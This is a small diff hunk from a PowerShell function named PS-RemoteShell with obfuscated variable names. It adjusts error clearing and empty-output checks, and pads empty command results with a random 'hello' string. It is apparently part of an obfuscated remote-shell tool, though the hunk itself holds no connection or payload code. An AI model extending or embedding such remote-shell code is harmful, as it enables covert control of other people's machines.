@@ -225,16 +225,15 @@ function PS-RemoteShell {
             }
             
             $VAR27 = ($error[0] | Out-String)
+	    $error.Clear()
             
-            if($VAR26 -eq "" -And $VAR27 -eq "") {
+            if([string]::IsNullOrEmpty($VAR26) -And [string]::IsNullOrEmpty($VAR27)) {
                 $VAR28 = Get-Random -Maximum 50 -Minimum 1
                 $VAR29 = VAR51 -Length $VAR28
                 $VAR26 = "hello $($VAR29)"
             }
             
             $VAR26  = $VAR26 + "`n"
-            
-            $error.Clear()
             $VAR21 = $VAR26 + $VAR27
         }
     }
